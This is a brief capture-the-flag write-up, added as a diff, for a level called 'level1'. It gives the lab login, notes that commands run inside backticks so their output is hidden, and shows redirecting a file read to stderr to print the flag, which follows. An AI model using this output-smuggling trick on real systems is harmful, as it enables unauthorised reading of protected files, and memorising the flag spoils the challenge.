@@ -1,0 +1,12 @@
+user : level1
+pass: level1
+
+we run /bin/bash
+
+The output is redirected because the call is done inside `` (backtilt)
+
+We redirect the output to stderr to be able to read it
+
+cat /home/level1/flag.txt 1>&2
+
+Flag : FLAG-U96l4k6m72a051GgE5EN0rA85499172K
